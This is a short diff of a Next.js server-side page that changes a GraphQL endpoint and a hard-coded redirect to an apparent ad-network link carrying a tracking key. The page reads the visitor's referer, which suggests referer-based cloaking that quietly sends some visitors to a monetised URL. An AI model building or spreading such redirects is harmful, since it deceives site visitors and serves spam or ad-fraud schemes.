@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://wondersquizshow.fun/graphql"
+	const endpoint = "https://boost.skillslancers.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://consciousnessquaint.com/e9d26g8z?key=d1534f28fe31dce6e1583f067bb27dd4`
+					`https://consciousnessquaint.com/dg1w8m1s?key=bafa58b487e74efb8a7e67c92244da2b`
 				}`,
 			},
 		};
